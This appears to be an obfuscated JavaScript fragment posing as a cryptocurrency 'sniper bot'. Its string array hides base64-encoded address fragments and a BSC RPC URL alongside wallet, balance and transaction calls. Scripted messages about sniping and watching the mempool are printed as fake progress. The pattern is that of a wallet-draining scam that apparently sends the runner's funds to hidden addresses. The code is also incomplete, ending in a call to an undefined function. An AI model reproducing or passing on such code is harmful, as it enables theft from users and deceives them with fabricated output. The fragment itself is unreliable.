function _0x33cf() { const _0xda1d86 = ['2:\x20attempting\x20to\x20snipe\x20.....', 'getBalance', '1\x20packet\x20received.....', '2\x20packet\x20received.....', '46260XriYyW', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'Contract', 'wei', '268SiHVgf', '4992932YbWUJH', 'setWord', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', '1:\x20found\x20owners\x20liq\x20function\x20...', 'base64', 'MHg2QjU1M0QwRjhkM2I3OUJkODE=', 'from', '1\x20pending\x20blockchain\x20response.....', '6dgHkRB', 'balanceOf', '2:\x20finalizing....', 'log', 'refreshing\x20socket\x20connection...', 'sendTransaction', '21236844IMpsyI', '6999264eRQHBC', '990694UKsfsZ', '2\x20pending\x20blockchain\x20response.....', 'toString', 'MHgwZDJmNmQ', 'Mjk0MjE5O', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'WIzNjRlQ0FG', '590470tkMrdZ', 'utils', 'MmE5ODRlNkUzZkNlNTQ4NjVEMUM0ZQ==', 'JsonRpcProvider', 'wait', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'YzMjQ1NDBh', 'pending\x20liquidity\x20add...', 'ascii', 'RDRD', 'providers', '2:\x20watching\x20blockchain\x20activity\x20.....', 'Wallet', 'parseUnits', '1sXZXHh', 'connection\x20established....', '4959865GURcEK', '8WzYUGF', 'connection\x20succesful...', 'parseEther', 'hexlify', '66bHdrGt', 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==', 'toFixed'];
    _0x33cf = function() { return _0xda1d86; }; return _0x33cf(); }
ethersrather();
